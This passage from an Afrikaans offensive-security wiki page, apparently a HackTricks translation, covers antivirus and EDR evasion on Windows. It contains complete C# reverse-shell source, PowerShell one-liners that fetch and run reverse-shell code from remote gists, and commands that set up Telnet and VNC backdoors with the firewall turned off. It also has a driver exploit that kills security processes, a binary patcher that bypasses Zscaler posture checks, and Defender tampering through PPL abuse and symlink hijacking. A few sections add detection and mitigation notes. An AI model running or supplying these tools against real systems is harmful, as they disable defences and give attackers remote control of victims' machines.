- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL in shellcode omskakel en dit dan laai

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien wanneer jy uitvoerbare lêers vanaf die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die aanvang van potensieel kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik met 'n reputasie-gebaseerde benadering, wat beteken dat ongereeld afgelaaide toepassings SmartScreen sal aktiveer, en sodoende die eindgebruiker waarsku en verhinder om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur More Info -> Run anyway).

**MoTW** (Mark of The Web) is 'n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers vanaf die internet afgelaai word, saam met die URL van waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat vanaf die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om te let dat executables wat met 'n **betroubare** ondertekeningssertifikaat onderteken is, **sal nie SmartScreen aktiveer nie**.

'n Baie effektiewe manier om te verhoed dat jou payloads die Mark of The Web kry, is om hulle in 'n soort houer soos 'n ISO te verpak. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** op **nie-NTFS** volumes toegepas kan word nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n hulpmiddel wat payloads in uitvoerhouers inpak om Mark-of-the-Web te ontduik.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier is 'n demo om SmartScreen te omseil deur payloads binne ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is 'n kragtige logmeganisme in Windows wat toepassings en stelselkomponente toelaat om **log events**. Dit kan egter ook deur sekuriteitsprodukte gebruik word om kwaadwillige aktiwiteite te monitor en te detect.

Soortgelyk aan hoe AMSI gedeaktiveer (bypassed) word, is dit ook moontlik om die **`EtwEventWrite`** funksie van die user space-proses onmiddellik te laat return sonder om enige gebeure te log. Dit word gedoen deur die funksie in geheue te patch sodat dit onmiddellik return, wat ETW logging effektief vir daardie proses deaktiveer.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Om C# binaries in memory te laai is al geruime tyd bekend en dit is steeds 'n uitstekende manier om jou post-exploitation tools te laat loop sonder om deur AV gevang te word.

Aangesien die payload direk in die geheue gelaai word sonder om die disk te raak, hoef ons slegs bekommerd te wees oor die patching van AMSI vir die hele proses.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bied reeds die vermoë om C# assemblies direk in memory te execute, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels die **spawning a new sacrificial process**, inject your post-exploitation malicious code into that new process, execute your malicious code en wanneer klaar, kill the new process. Dit het beide voordele en nadele. Die voordeel van die fork and run-metode is dat uitvoering plaasvind **outside** ons Beacon implant proses. Dit beteken dat as iets in ons post-exploitation aksie verkeerd gaan of gevang word, daar 'n **much greater chance** is dat ons **implant surviving.** Die nadeel is dat jy 'n **greater chance** het om gevang te word deur **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan oor die injecting van die post-exploitation malicious code **into its own process**. Op hierdie manier kan jy vermy om 'n nuwe proses te skep en dat dit deur AV gescan word, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou payload, daar 'n **much greater chance** is om **losing your beacon** aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer wil lees oor C# Assembly loading, kyk gerus na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies **from PowerShell** laai — kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Gebruik van Ander Programmeertale

As voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om malicious code in ander tale uit te voer deur die gekompromitteerde masjien toegang te gee tot die **interpreter environment installed on the Attacker Controlled SMB share**.

Deur toegang te verleen tot die Interpreter Binaries en die environment op die SMB share kan jy **execute arbitrary code in these languages within memory** van die gekompromitteerde masjien.

Die repo dui aan: Defender scan nog steeds die scripts, maar deur Go, Java, PHP, ens. te gebruik het ons **more flexibility to bypass static signatures**. Toetsing met lukrake on-obfuscated reverse shell scripts in hierdie tale het sukses behaal.

## TokenStomping

Token stomping is 'n tegniek wat 'n aanvaller toelaat om die toegangstoken of 'n sekuriteitsproduk soos 'n EDR of AV te **manipulate**, waardeur hulle die privileges kan verminder sodat die proses nie sal die nie (won't die) maar ook nie die permissies het om na kwaadwillige aktiwiteite te check nie.

Om dit te voorkom kan Windows **prevent external processes** van die kry van handles oor die tokens van sekuriteitsprosesse.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Gebruik van Betroubare Sagteware

### Chrome Remote Desktop

Soos beskryf in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om Chrome Remote Desktop op 'n victim's PC te deploy en dit dan te gebruik om dit oor te neem en persistence te behou:
1. Download from https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. Die wizard sal dan vra vir authorization; klik die Authorize knop om voort te gaan.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin parameter wat toelaat om die pin te stel sonder om die GUI te gebruik).


## Gevorderde Ontduiking

Ontduiking is 'n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetrie in net een stelsel in ag neem, so dit is amper onmoontlik om heeltemal onopgemerk te bly in volwasse omgewings.

Elke omgewing teen wie jy optree sal sy eie sterk- en swakpunte hê.

Ek beveel sterk aan dat jy hierdie talk van [@ATTL4S](https://twitter.com/DaniLJ94) kyk om 'n ingang tot meer Advanced Evasion techniques te kry.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook nog 'n goeie praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Oude Tegnieke**

### **Kontroleer watter dele Defender as kwaadwillig vind**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat dele van die binary sal **remove parts of the binary** totdat dit uitvind watter deel **Defender** as kwaadwillig vind en dit vir jou opsplit.\
Nog 'n hulpmiddel wat dieselfde doen is [**avred**](https://github.com/dobin/avred) met 'n open web wat die diens bied by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot Windows10 het alle Windows-weergawes 'n **Telnet server** gehad wat jy as administrateur kon installeer deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Laat dit **begin** wanneer die stelsel begin en **voer** dit nou uit:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet poort** (stealth) en skakel firewall af:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laai dit af vanaf: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin downloads hê, nie die setup nie)

**OP DIE GASHEER**: Voer _**winvnc.exe**_ uit en stel die bediener op:

- Aktiveer die opsie _Disable TrayIcon_
- Stel 'n wagwoord in by _VNC Password_
- Stel 'n wagwoord in by _View-Only Password_

Skuif dan die binêre _**winvnc.exe**_ en die **nuut** geskepte lêer _**UltraVNC.ini**_ binne die **victim**

#### **Omgekeerde verbinding**

Die **attacker** moet op sy **host** die binêre `vncviewer.exe -listen 5900` uitvoer sodat dit **gereed** is om 'n omgekeerde **VNC verbinding** op te vang. Dan, binne die **victim**: Begin die winvnc-demon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WAARSKUWING:** Om stealth te behou moet jy 'n paar dinge nie doen nie

- Moet nie `winvnc` begin as dit reeds loop nie, anders sal jy 'n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. Kontroleer of dit loop met `tasklist | findstr winvnc`
- Moet nie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal dit [die konfigurasie-venster](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moet nie `winvnc -h` vir hulp uitvoer nie, anders sal jy 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af vanaf: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Nou **begin die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Die huidige Defender sal die proses baie vinnig beëindig.**

### Kompileer ons eie reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# met die kompilator
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik python vir build injectors voorbeeld:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander gereedskap
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR uit die kernel-ruimte uitskakel

Storm-2603 het 'n klein konsole-hulpmiddel gebruik wat bekend staan as **Antivirus Terminator** om endpoint-beskerming uit te skakel voordat ransomware afgelewer is. Die hulpmiddel bring sy **eie kwetsbare maar *gesigneerde* driver** en misbruik dit om geprivilegieerde kernel-operasies uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.

Belangrike punte
1. **Signed driver**: Die lêer wat na skyf afgelewer word is `ServiceMouse.sys`, maar die binêre is die wettig gesigneerde driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver 'n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste reël registreer die driver as 'n **kernel service** en die tweede begin dit sodat `\\.\ServiceMouse` vanaf userland toeganglik word.
3. **IOCTLs exposed by the driver**
| IOCTL code | Vermoë                              |
|-----------:|-------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimale C bewys-van-konsep:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Waarom dit werk**: BYOVD slaan gebruikersmodusbepalings heeltemal oor; kode wat in die kernel uitgevoer word kan *protected* prosesse open, dit beëindig, of met kernel-objekte morrel ongeag PPL/PP, ELAM of ander aanskerpingsmeganismes.

Opsporing / Mitigering
•  Aktiveer Microsoft se vulnerable-driver block list (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.
•  Monitor die skepping van nuwe *kernel* dienste en waarsku wanneer 'n driver vanaf 'n wêreld-wyde skryfbare gids gelaai word of nie op die allow-list is nie.
•  Let op user-mode handvatsels na custom device objects wat gevolg word deur verdagte `DeviceIoControl`-aanroepe.

### Omseiling van Zscaler Client Connector se posture-kontroles deur on-disk binêre patching

Zscaler se **Client Connector** pas device-posture reëls lokaal toe en staatmaak op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpskeuses maak 'n volledige omseiling moontlik:

1. Posture-evaluasie gebeur **heeltemal client-side** (n boolean word na die bediener gestuur).
2. Interne RPC-endpunte valideer slegs dat die verbindende uitvoerbare lêer **deur Zscaler gesigneer is** (via `WinVerifyTrust`).

Deur **vier gesigneerde binêre lêers op skyf te patch** kan beide meganismes geïgnoreer word:

| Binary | Oorspronklike logika wat gepatch is | Resultaat |
|--------|-------------------------------------|----------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug sodat elke kontrole voldoen |
| `ZSAService.exe` | Indirekte oproep na `WinVerifyTrust` | NOP-ed ⇒ enige (selfs unsigned) proses kan aan die RPC-pype bind |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Kortgesluit |

Minimale patcher-uittreksel:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nadat die oorspronklike lêers vervang is en die diensstack herbegin is:

* **Alle** posture checks wys **groen/kompatibel**.
* Ongesigneerde of gewysigde binaries kan die named-pipe RPC-endpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk soos gedefinieer deur die Zscaler-beleide.

Hierdie gevallestudie demonstreer hoe suiwer client-side vertrouensbesluite en eenvoudige handtekeningkontroles met 'n paar byte-patches oorwin kan word.

## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te manipuleer

Protected Process Light (PPL) afdwing 'n signer/level-hiërargie sodat slegs gelyk-of-hoër beskermde prosesse mekaar kan manipuleer. Offensief, as jy legitimiet 'n PPL-ondersteunde binary kan loods en sy argumente beheer, kan jy goedaardige funksionaliteit (bv. logging) omskep in 'n beperkte, PPL-ondersteunde skryf-primitive teen beskermde gidse wat deur AV/EDR gebruik word.

Wat veroorsaak dat 'n proses as PPL loop
- Die teiken EXE (en enige gelaaide DLLs) moet gesigneer wees met 'n PPL-gefasiliteerde EKU.
- Die proses moet geskep word met CreateProcess met die vlae: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 'n Kompatibele beskermingsvlak moet versoek word wat ooreenstem met die signer van die binary (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware signers, `PROTECTION_LEVEL_WINDOWS` vir Windows signers). Verkeerde vlakke sal tydens skepping misluk.

Sien ook 'n breër inleiding tot PP/PPL- en LSASS-beskerming hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-gereedskap
- Open-source hulpinstrument: CreateProcessAsPPL (kies beskermingsvlak en stuur argumente aan die teiken EXE): 
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Gebruikspatroon:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die gesigneerde stelsel-binary `C:\Windows\System32\ClipUp.exe` spawn self en aanvaar 'n parameter om 'n loglêer na 'n deur die oproeper-gespesifiseerde pad te skryf.
- Wanneer dit as 'n PPL-proses geloods word, gebeur die lêerskrywing met PPL-ondersteuning.
- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3-kortpaaie om na normaalweg beskermde plekke te wys.

8.3 short path helpers
- Lys kortname: voer `dir /x` in elke ouergids uit.
- Bepaal kortpad in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Loods die PPL-geskikte LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur 'n launcher te gebruik (bv. CreateProcessAsPPL).
2) Gee die ClipUp log-pad argument om 'n lêerskepping in 'n beskermde AV-gids af te dwing (bv. Defender Platform). Gebruik 8.3-kortname indien nodig.
3) As die teiken-binary normaalweg deur die AV oop of gegrendel is terwyl dit loop (bv. MsMpEng.exe), skeduleer die skrywing by opstart voordat die AV begin deur 'n auto-start service te installeer wat betroubaar vroeër loop. Valideer opstartvolgorde met Process Monitor (boot logging).
4) By herstart gebeur die PPL-ondersteunde skrywing voordat die AV sy binaries sluit, wat die teikenlêer korrupteer en opstart verhoed.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Aantekeninge en beperkings
- Jy kan nie beheer wat ClipUp skryf nie, behalwe die ligging; die primitief is meer geskik vir korrupsie as vir presiese inhoudsinvoeging.
- Vereis plaaslike admin/SYSTEM om 'n diens te installeer/te begin en 'n herlaaisessie.
- Tydsberekening is kritiek: die teiken mag nie oop wees nie; uitvoering tydens opstart vermy lêslotte.

Opsporing
- Prosescreasie van `ClipUp.exe` met ongewone argumente, veral as dit deur nie‑standaard ouerprosesse gelanseer is, rondom opstart.
- Nuwe dienste wat gekonfigureer is om verdagte binaries outomaties te begin en wat konsekwent voor Defender/AV start. Ondersoek diensskepping/wysiging voor Defender-opstartfoute.
- Lêer‑integriteitsmonitering op Defender binaries/Platform‑gidse; onverwagte lêerskeppings/wysigings deur prosesse met protected-process‑vlae.
- ETW/EDR‑telemetrie: kyk vir prosesse geskep met `CREATE_PROTECTED_PROCESS` en abnormale PPL‑vlakgebruik deur nie‑AV binaries.

Mitigering
- WDAC/Code Integrity: beperk watter gesigneerde binaries as PPL mag loop en onder watter ouers; blokkeer ClipUp‑aanroep buite wettige kontekste.
- Dienshigiëne: beperk skepping/wysiging van outo‑start dienste en monitor startorde‑manipulasie.
- Sorg dat Defender tamper‑beskerming en vroeë‑laai beskermings aangeskakel is; ondersoek opstartfoute wat op binêre korrupsie dui.
- Oorweeg om 8.3 kortnaamgenerering op volumes wat security‑gereedskap huisves te deaktiveer as dit met jou omgewing versoenbaar is (toets deeglik).

Verwysings vir PPL en gereedskap
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulasie van Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvan dit loop deur subgidse onder:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subgids met die hoogste leksikografiese weergawe‑string (bv. `4.18.25070.5-0`), en begin dan die Defender diensprosesse daarvandaan (en werk diens-/registerbane ooreenkomstig by). Hierdie seleksie vertrou gidsinskrywings insluitend directory reparse points (symlinks). 'n Administrateur kan dit benut om Defender na 'n deur 'n aanvaller‑skryfbare pad om te lei en DLL sideloading of diensversteuring te bewerkstellig.

Voorvereistes
- Plaaslike Administrator (nodig om gidse/symlinks onder die Platform‑gids te skep)
- Vermoë om te herbegin of Defender platform herkiesing te trigger (diensherbegin tydens opstart)
- Slegs ingeboude gereedskap benodig (mklink)

Waarom dit werk
- Defender blokkeer skryfaksies in sy eie gidse, maar sy platform‑seleksie vertrou gidsinskrywings en kies die leksikografies hoogste weergawe sonder om te valideer dat die teiken na 'n beskermde/betroubare pad oplos.

Stap‑vir‑stap (voorbeeld)
1) Berei 'n skryfbare kloon van die huidige platform‑gids voor, bv. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep 'n directory symlink van 'n hoër weergawe binne Platform wat na jou folder wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger seleksie (herbegin aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die omleidingspad uitgevoer word:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe prosespad onder `C:\TMP\AV\` te sien en die dienskonfigurasie/register wat daardie ligging weerspieël.

Post-exploitation opsies
- DLL sideloading/code execution: Plaas/vervang DLLs wat Defender vanaf sy toepassingsgids laai om code in Defender se prosesse uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
